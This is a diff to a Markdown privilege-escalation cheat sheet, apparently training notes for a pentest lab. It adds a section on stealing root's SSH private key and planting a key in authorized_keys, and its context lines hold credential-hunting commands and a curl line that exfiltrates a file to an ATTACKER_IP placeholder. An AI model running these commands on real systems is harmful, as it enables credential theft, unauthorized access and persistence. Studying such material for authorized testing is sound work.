@@ -76,6 +76,8 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 locate password,passwd,secret | more
 find / -name id_rsa 2> /dev/null
 history | grep pass
+
+# This is very common with configuration files, log files, and user history #files (bash_history in Linux and PSReadLine in Windows)
 ```
 
 ### Extracting and Cracking Passwords
@@ -229,6 +231,10 @@ chmod +x /tmp/ls
 > write these hash in x position of /etc/passwd of user. if passwd have rwx permission
 
 
+## Vulnerable Software:
+Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
+
+
 
 
 ###  Usefull Scripts or C file codes:
@@ -338,7 +344,41 @@ curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:PORT/upload
 
 
 
+## SSH Keys :
+```bash
+ If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:
+ 
+somx@htb[/htb]$ vim id_rsa
+somx@htb[/htb]$ chmod 600 id_rsa
+somx@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
 
+root@10.10.10.10#
+
+If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:
+
+somx@htb[/htb]$ ssh-keygen -f key
+
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): *******
+Enter same passphrase again: *******
+
+Your identification has been saved in key
+Your public key has been saved in key.pub
+The key fingerprint is:
+SHA256:...SNIP... user@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|   ..o.++.+      |
+...SNIP...
+|     . ..oo+.    |
++----[SHA256]-----+
+
+This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:
+
+user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+
+
+```
 
 
 
